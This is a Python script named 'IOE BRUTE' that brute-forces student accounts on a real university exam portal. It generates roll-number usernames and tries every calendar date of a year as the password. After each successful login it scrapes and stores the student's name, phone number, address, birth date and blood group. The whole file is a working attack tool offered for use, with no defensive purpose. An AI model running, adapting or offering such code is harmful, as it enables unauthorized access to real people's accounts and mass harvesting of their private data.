#!/bin/python3
import os
import sys
import re
import json
import socket
from urllib.error import URLError

# tries to import the modules, if not found it installs them
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")
try:
    from bs4 import BeautifulSoup as soup
except ImportError:
    os.system("pip install BeautifulSoup")
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")


# creating a browser using mechanize , cookiejar had to be created to save the cookies and delete it after sucessful login.

br = mechanize.Browser()
cookie_jar = mechanize.CookieJar()
br.set_cookiejar(cookie_jar)


# Initial function that get the required information from the user
def main():
    college = get_college()
    batch = get_batch()
    faculty = get_faculty()
    print("\n")

    noOfStudents = int(input("Enter the total number of students: "))+1
    getYear = input(
        f"Enter the year to attack (Leave empty for default {2000+int(batch)-19}):")
    if (getYear == ""):
        getYear = str(2000+int(batch)-19)
    data = dataFile(college, batch, faculty, getYear)

    run(college, batch, faculty, noOfStudents, data, getYear)


# Prints the logo
def icon():
    result = pyfiglet.figlet_format("IOE BRUTE")
    print(result)
    print("Developed by Sandeep Poudel )\n")


# Gets the college that user want to use
def get_college():

    os.system('clear')
    icon()
    college_map = {
        1: "THA",
        2: "PUL",
        3: "PUR",
        4: "PAS"
    }

    print('''Enter the college of the students:
    Thapathali     ---  1
    Pulchowk       ---  2
    Purwanchal     ---  3
    Paschimanchal  ---  4
    Exit           ---  99
    ''')

    while True:
        cllg = int(input("Enter your choice: "))
        if cllg == 99:
            sys.exit()
        if cllg not in college_map:
            print("\nPlease enter a valid input \n")
        else:
            return (college_map[cllg])


# Get the batch of the students you want to find details of
def get_batch():
    os.system('clear')
    icon()
    year_map = {
        1: "080",
        2: "079",
        3: "078",
        4: "077",
        5: "076"
    }
    while True:
        print('''Select the admission year of the student:
        2080 --- 1
        2079 --- 2
        2078 --- 3
        2077 --- 4
        2076 --- 5
        Exit --- 99
        ''')
        while True:
            yrs = int(input("Enter your choice: "))
            if yrs == 99:
                sys.exit()
            if yrs not in year_map:
                print("\nPlease provide a valid input\n")
            else:
                return year_map[yrs]


# Gets the faculty the user wants to use
def get_faculty():
    os.system('clear')
    icon()
    faculty_map = {
        1: "BAG",
        2: "BAR",
        3: "BCE",
        4: "BCT",
        5: "BEI",
        6: "BEL",
        7: "BME"
    }
    while True:
        print('''Enter the faculty of the students:
        Agriculture Engineering (BAG)  ---  1
        Architecture            (BAR)  ---  2
        Civil Engineering       (BCE)  ---  3
        Computer Engineering    (BCT)  ---  4
        Electronics Engineering (BEI)  ---  5
        Electrical Engineering  (BEL)  ---  6
        Mechanical Engineering  (BME)  ---  7
        Back ---  00
        Exit ---  99
        ''')
        while True:
            fac = int(input("Enter your choice: "))
            if fac == 99:
                sys.exit()
            if fac not in range(1, 8):
                print("\nPlease enter a valid input \n")
            return faculty_map[fac]


# Checks if there is a data file for the college,faculty and batch the user chose
# If found it uses it , if not then it creates the file and adds the required values to run the program .

# ------------------------------------ DONT   CHANGE  ---------------------------------------------------
# ------------------------------------- DONT   CHANGE  ---------------------------------------------------

def dataFile(college, batch, faculty, getYear):

    # creates the name for the json file
    data_file = "Json_files/"+college+batch+faculty+".json"
    if not os.path.exists("Json_files"):
        os.system("mkdir Json_files")

    # tries to open the file. if file is present it checks if the Year user provided is present if not it adds the values for the year.

    try:
        with open(data_file, "r") as f:
            savedData = json.load(f)
            if getYear not in savedData[0]:
                savedData[0][getYear] = {
                    "checkedMonth": 1,
                    "checkedRoll": 1
                }
            with open(data_file, "w") as f:
                json.dump(savedData, f)
            return {"dataInFile": savedData, "fileName": data_file}

    # if file is not present then create the file.
    except FileNotFoundError:
        fileInitialConfig = f'''
[        
    {{             
        "arrayData": [],
        "{getYear}": {{
            "checkedMonth": 1,
            "checkedRoll": 1
        }}
    }}
]
'''
    # writing the initial configuration required for the script to run
        with open(data_file, "w") as f:
            f.write(fileInitialConfig)

        with open(data_file, "r") as f:
            savedData = json.load(f)
            return {"dataInFile": savedData, "fileName": data_file}


# Loops over the whole year and all the students to create username and password
def run(college, batch, faculty, noOfStudents, data, getYear):
    print("Running! Have patience :)    ...\n")

    # Get the starting month and roll number from the file so that you can start where you left off before.
    initialMonth = data["dataInFile"][0][f'{getYear}']["checkedMonth"]
    initialRoll = data["dataInFile"][0][f'{getYear}']["checkedRoll"]

    # Loop through the students
    for students in range(initialRoll, noOfStudents):
        rep = True
        updateData(initialMonth, students, data, getYear)
        if students not in data["dataInFile"][0]["arrayData"]:
            print(f"\r ")
            print(f"\rCurrently on student {students}")

        if students < 10:
            roll = college + batch + faculty + "00" + str(students)
        elif (students < 100):
            roll = college + batch + faculty + "0" + str(students)
        else:
            roll = college + batch + faculty + str(students)
        # Loop through the months starting from the month that you left off before.
        for month in range(initialMonth, 13):
            data["dataInFile"][0][f'{getYear}']["checkedMonth"] = month
            # Update the values in the JSON file every time one month is completed
            updateData(month, students, data, getYear)

            # Create password for different months.
            if month < 10:
                passMonth = getYear + "-0" + str(month) + "-"
            else:
                passMonth = getYear + "-" + str(month) + "-"

            if students not in data["dataInFile"][0]["arrayData"]:
                for days in range(1, 32):
                    if days < 10:
                        password = passMonth + "0" + str(days)
                    else:
                        password = passMonth + str(days)
                    if rep:
                        # Function that tries to login to the website
                        login(roll, password, data, students)
                    else:
                        break
            else:
                continue

            initialRoll = 1  # Reset initialRoll for the next run

        initialMonth = 1  # Reset initialMonth for the next student


# Tries to login to the website
# If sucessful runs the detail function to find the details of the student
def login(username, password, data, students):
    global rep
    timeout = 10.0
    socket.setdefaulttimeout(timeout)

    try:

        # Configuring the browser
        br.addheaders = [
            ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
        br.set_handle_robots(False)
        br._factory.is_html = True

        # Open the login page
        br.open("http://exam.ioe.edu.np:81/Login")

        # Select the form and fill in the details
        br.select_form(nr=0)
        br.form['UserName'] = username
        br.form['Password'] = password
        print("\r" + username + " " + password, end=" ")

        # Submit the form
        response = br.submit()
        response_data = response.read()

        # Check the response
        if not json.loads(response_data)['IsSuccess']:
            br.back()
        else:
            rep = False
            print("\r" + "\b\b\b\b         ")
            br.open("http://exam.ioe.edu.np:81/StudentPortal/Dashboard")
            # calling function to find the details and write it in files.
            details(data, students)

    except (mechanize.HTTPError, URLError, socket.timeout) as e:
        print("continuing...")
   

# finds the detail of the student and writes it to the corresponding files
def details(data, students):
    # reads the response
    html = br.response().read()
    savedData = data["dataInFile"]
    # clearing the history and cookies so that when you send request in the website again it wouldnt login you automatically using the previous account.
    br.clear_history()
    cookie_jar.clear()
    sp = soup(html, 'html.parser')

    # regular expression to find the data stored in javascript object in source code of the website.
    match = re.search(r'var data = ({.*?});', str(sp))
    if match:
        varfoundData = match.group(1)
        foundData = json.loads(varfoundData)

    # prints the student details in the terminal
        print(f'''
--------------------------------
Name :{foundData['FullName']}
Registration No: {foundData['RegistrationNo']}
College: {foundData['College']}
Phone No: { foundData['ContactNo']}
Address: {foundData['MunVdc']} {foundData['WardNo']}
Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd'][0:10]}
Blood Group: {foundData['BloodGroup']}
--------------------------------
\n''')

    # making object of the found data in desired format
        rawfoundData = {
            "Name": foundData['FullName'],
            "Registration No": foundData['RegistrationNo'],
            "College": foundData['College'],
            "Phone No": foundData['ContactNo'],
            "Address": foundData['MunVdc'] + " " + foundData['WardNo'],
            "Birth Date": {"bs": foundData['BirthDateBs'], "ad": foundData['BirthDateAd'][0: 11]},
            "Blood Group": str(foundData['BloodGroup'])
        }
    # append the details of the students in the savedData array and write it in the corresponding json file.
        savedData.append(rawfoundData)
        savedData[0]["arrayData"].append(students)

        with open(data["fileName"], "w") as f:
            json.dump(savedData, f)


# writing the student details in the foundData.txt file
        file = open("foundData.txt", "a+")
        file.write(f'''
------------------------------------
Registration No: {foundData['RegistrationNo']} 
Name : {foundData['FullName']} 
College: {foundData['College']} 
Phone No: {foundData['ContactNo']} 
Address: {foundData['MunVdc']} {foundData['WardNo']} 
Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd']}  
Blood Group: {str(foundData['BloodGroup'])}  
------------------------------------
            ''')
        file.close()
        sort(data['fileName'])


# updates the data in the file so that you can start from the point where you stopped the script.
def updateData(newMonth, newRoll, data, year):
    if year not in data["dataInFile"][0]:
        data["dataInFile"][0][year] = {
            "checkedMonth": newMonth,
            "checkedRoll": newRoll
        }
    else:
        data["dataInFile"][0][year]["checkedMonth"] = newMonth
        data["dataInFile"][0][year]["checkedRoll"] = newRoll

    with open(data["fileName"], "w") as f:
        json.dump(data["dataInFile"], f)


# sort the json file in ascending order of ROll number of students.
# sorts in every sucessful login so that the details are shown in ascending order which makes it easier to find and search a specific person.
def extract_number(registration_no):
    registration_no = str(registration_no)  # Ensure the input is a string
    match = re.search(r'\d+$', registration_no)
    if match:
        return int(match.group())
    else:
        return 0

def sort(file):
    with open(file, "r") as f:
        data = json.load(f)
    # Sort based on registration number
    data[1:] = sorted(
        data[1:], key=lambda x: extract_number(x['Registration No']))
    # Sort arrayData within the first element
    data[0]['arrayData'] = sorted(data[0]['arrayData'], key=extract_number)
    with open(file, "w") as f:
        json.dump(data, f)
# running the main function
if __name__ == '__main__':
    main()
